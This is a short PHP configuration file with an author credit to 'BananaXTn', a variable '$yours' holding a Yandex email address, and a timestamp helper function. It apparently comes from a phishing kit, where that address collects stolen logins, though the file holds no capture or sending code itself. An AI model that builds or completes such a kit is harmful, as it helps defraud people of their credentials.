<?php
	/*
	/ -> All Created By BananaXTn
	/ -> https://www.telegram.com
	/ ->
	*/
	

	// ================================= //

	$yours = "ridash.rez.fr@yandex.com";
	// ================================= //


	function now() {
		date_default_timezone_set('GMT');
		return date("d/m/Y h:i:sa");
	}

?>